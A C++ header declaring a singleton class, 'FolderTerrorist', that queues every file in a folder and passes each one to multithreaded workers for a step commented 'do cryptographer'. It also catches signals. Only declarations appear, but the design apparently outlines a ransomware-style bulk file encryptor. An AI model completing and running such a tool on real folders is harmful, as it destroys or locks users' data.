#pragma once
#include <iostream>
#include <string>
#include <vector>
#include <list>
#include <thread>
#include <mutex>
#include <csignal>

class FolderTerrorist {
public:

    FolderTerrorist();

    static FolderTerrorist *GetInstance() {
        if (p_instance == nullptr) {
            p_instance = new FolderTerrorist;
        }
        return p_instance;
    }

    ~FolderTerrorist();

    void SetFolderName(const std::string &folderName);

    const std::string &GetFolderName() const;

    void Start();

    void Start(std::string path);

    void SignalsCatching();
private:
    static inline FolderTerrorist *p_instance;

    std::string folder_name;

    std::vector<std::thread> threads;

    std::list<std::string> files_queue;

    std::mutex mtx;

    std::vector<std::string> GetFolderFiles();

    void UpdateQueue();

    void ReleaseQueue();

    //do cryptographer
    void FolderFileTerror(const std::string &file_path);

    static void SignalsHandler(int signal);
};